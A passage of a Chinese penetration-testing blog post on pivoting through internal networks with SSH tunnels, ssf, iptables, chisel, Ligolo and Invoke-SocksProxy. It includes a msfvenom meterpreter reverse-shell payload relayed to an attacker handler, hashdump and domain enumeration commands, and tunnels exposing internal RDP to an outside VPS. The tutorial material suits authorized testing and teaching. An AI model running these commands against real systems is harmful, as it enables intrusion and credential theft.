class=\&quot;line\&quot;&gt;&lt;span&gt;把内网10.1.1.108的SSH转发出来&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/171.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器访问内网端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/172.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;&lt;strong&gt;单层网络反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;边界机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssfd.exe -p 1080&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/173.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;内网机器执行：&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssf.exe -R 12138:10.1.1.108:22 -p 1080 192.168.0.106&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/174.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/175.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ssh\&quot;&gt;ssh&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ssh\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;&lt;strong&gt;SSH基本参数&lt;/strong&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-C 压缩传输，加快传输速度&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-f 在后台对用户名密码进行认证&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-q 安静模式，不要显示任何debug信息&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-l 指定ssh登录名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-g 允许远程主机连接到本地用于转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-L 进行本地端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-R 进行远程端口转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-D 动态转发，即socks代理&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-T 禁止分配伪终端&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;-p 指定远程ssh服务端口&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;正向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;ol&gt;\n&lt;li&gt;方法一\n外网靶机110，内网靶机115\n本地攻击机编辑后restart ssh服务&lt;/li&gt;\n&lt;/ol&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;本地攻击机执行，把115的3389映射到本地的33890上&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ssh -C -f -N -g -L 33890:192.168.0.115:3389 root@192.168.0.110 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;ol start=\&quot;2\&quot;&gt;\n&lt;li&gt;方法2（上线MSF）\n** 攻击机—出网Linux靶机—不出网Linux靶机—不出网win机 **\n攻击逻辑说明：&lt;/li&gt;\n&lt;/ol&gt;\n&lt;ul&gt;\n&lt;li&gt;Windows 执行 1.exe&lt;/li&gt;\n&lt;li&gt;→ 连接 “不出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;不出网 Linux 把 12138 映射到 “出网 Linux:12138”&lt;/li&gt;\n&lt;li&gt; ↓ （SSH 转发）&lt;/li&gt;\n&lt;li&gt;出网 Linux 把 12138 映射到 “攻击机:12345”\n    ↓&lt;/li&gt;\n&lt;li&gt;攻击机 msfconsole 收到 meterpreter 会话&lt;/li&gt;\n&lt;/ul&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=不出网Linux机 lport=12138 -f exe -o /var/www/html/1.exe&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;攻击机监听端口12345&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; use exploit/multi/handler&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set lport 12345&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; set ExitOnSession false&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 exploit(multi/handler) &gt; exploit -j&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Exploit running as background job 0.&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;[*] Started reverse TCP handler on 0.0.0.0:12345&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;不出网Linux机&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -C -f -N -g -L 0.0.0.0:12138:攻击机:12345 root@出网Linux主机 -p 22&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这样就建立连接了，然后可以这样做&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 把会话放到后台&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; background&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 查看/升级 transport（断网重连）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;msf6 &gt; sessions -i 1&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport list&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport add -t reverse_tcp -l 攻击机公网IP -p 443&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; transport next&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;# 常用其它命令&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; sysinfo # 系统版本 / 补丁\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; getuid # 当前用户 / 特权\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_domain #域信息\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_av 杀软 / 防火墙\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0-3.0/24 # 网络段\t&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; hashdump（需 SYSTEM） # 密码哈希（需SYSTEM）&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;meterpreter &gt; run post/windows/gather/enum_logged_on_users # 最近登录\t&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;strong&gt;反向转发&lt;/strong&gt;&lt;/p&gt;\n&lt;p&gt;外网攻击107，内网靶机97&lt;/p&gt;\n&lt;p&gt;出网靶机编辑后restart ssh服务&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;#vim /etc/ssh/sshd_conf&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;AllowTcpForwarding yes 允许TCP转发&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;GatewayPorts yes   允许远程主机连接本地转发的端口&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;TCPKeepAlive yes    TCP会话保持存活&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;PasswordAuthentication yes  密码认证&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;边界靶机上执行，把内网靶机97的3389映射到公网VPS107的33809上\nssh -C -f -N -g -R 33890:10.1.1.97:3389 root@192.168.0.107 -p 22\nnetstat –tnlp&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/165.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;转发成功，外网攻击机安装apt install rinetd(正向tcp转发工具)&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;vim /etc/rinetd.conf\n添加0.0.0.0 3389 127.0.0.1 33890\nservice rinetd start&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/166.png)&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;看到107是kali攻击机，连接107:33890即可到达内网10.1.1.97的桌面&lt;/p&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/167.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;invoke-socksproxy\&quot;&gt;Invoke-SocksProxy&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#invoke-socksproxy\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://gitee.com/RichChigga/Invoke-SocksProxy&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Import-Module .\\Invoke-SocksProxy.psm1 &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;Invoke-SocksProxy -bindPort 12138 建立socks代理，使用代理软件连接&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/168.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt; &lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/169.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h1 id=\&quot;ligolo\&quot;&gt;Ligolo&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#ligolo\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;cd `go env GOPATH`/src&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;📢反引号 `...` 是 命令替换的意思，实际效果就是会返回go的环境变量路径拼接到后面使用。&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;git clone https://github.com/sysdream/ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;cd ligolo&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make dep&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;生成证书,example.com换成攻击机的域名或IP地址&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make certs TLS_HOST=example.com&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;make build-all&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;靶机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;ligolo_windows_amd64.exe -relayserver 攻击机IP:5555&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;攻击机执行&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;./bin/localrelay_linux_amd64&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;以上场景适用于内网靶机可访问外网，但外网无法访问内网的情况，最后生成一个在攻击机上的11601 的socks5监听端口，实际生成效果和以下命令相似：&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;ssh -CfNg -D 11601 root@靶机IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;区别是隧道搭建时是靶机连攻击机，ssh是攻击机连靶机&lt;/p&gt;\n&lt;h1 id=\&quot;chisel\&quot;&gt;chisel&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#chisel\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;p&gt;工具下载链接：\n&lt;a href=\&quot;https://github.com/jpillora/chisel\&quot;&gt;https://github.com/jpillora/chisel&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;攻击机执行&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;chisel server -p 12138 –reverse&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/182.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n靶机执行&lt;p&gt;&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;&gt;chisel client 公网攻击机IP:12138 R:1234:127.0.0.1:3389&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/183.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;\n建立成功后，攻击机连接本机1234端口即可访问靶机3389\n&lt;figure class=\&quot;markdown-image-wrapper\&quot;&gt;&lt;img src=\&quot;https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/184.png\&quot; alt=\&quot;image\&quot; loading=\&quot;lazy\&quot; decoding=\&quot;async\&quot; class=\&quot;markdown-image\&quot;&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;iptables&quot;],&quot;text&quot;:[0,&quot;iptables&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;lcx&quot;],&quot;text&quot;:[0,&quot;lcx&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;msf&quot;],&quot;text&quot;:[0,&quot;msf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;netsh&quot;],&quot;text&quot;:[0,&quot;netsh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssf&quot;],&quot;text&quot;:[0,&quot;ssf&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ssh&quot;],&quot;text&quot;:[0,&quot;ssh&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;invoke-socksproxy&quot;],&quot;text&quot;:[0,&quot;Invoke-SocksProxy&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;ligolo&quot;],&quot;text&quot;:[0,&quot;Ligolo&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;chisel&quot;],&quot;text&quot;:[0,&quot;chisel&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/28&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;penetration/内网和域/内网常用命令&quot;],&quot;prevPostItem&quot;:[0,null],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/内网和域/端口转发和映射&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;端口映射和转发&quot;],&quot;date&quot;:[3,&quot;2026-01-23T10:36:57.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;端口转发&quot;],[0,&quot;映射&quot;],[0,&quot;代理&quot;],[0,&quot;proxy&quot;]]],&quot;categories&quot;:[1,[[0,&quot;Penetration&quot;],[0,&quot;内网和域&quot;]]]}],&quot;body&quot;:[0,&quot;# iptables\n\n```\n需开启ip转发功能\n&gt;vim /etc/sysctl.conf设置net.ipv4.ip_forward=1\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/179.png) ![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/180.png)\n\n```\n本地端口22转发到2222上\n&gt;iptables -t nat -A PREROUTING -p tcp --dport 2222 -j REDIRECT --to-ports 22\n内网98机器3389转到本机110的6789上\n&gt;iptables -t nat -A PREROUTING -d 192.168.0.110 -p tcp --dport 6789 -j DNAT --to-destination 192.168.0.98:3389\n&gt;iptables -t nat -A POSTROUTING -d 192.168.0.98 -p tcp --dport 3389 -j SNAT --to 192.168.0.110\n```\n\n![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/181.png)\n\n```\n查看规则\n&gt;iptables -t nat -L\n删除规则\n&gt;iptables -t nat -D PREROUTING 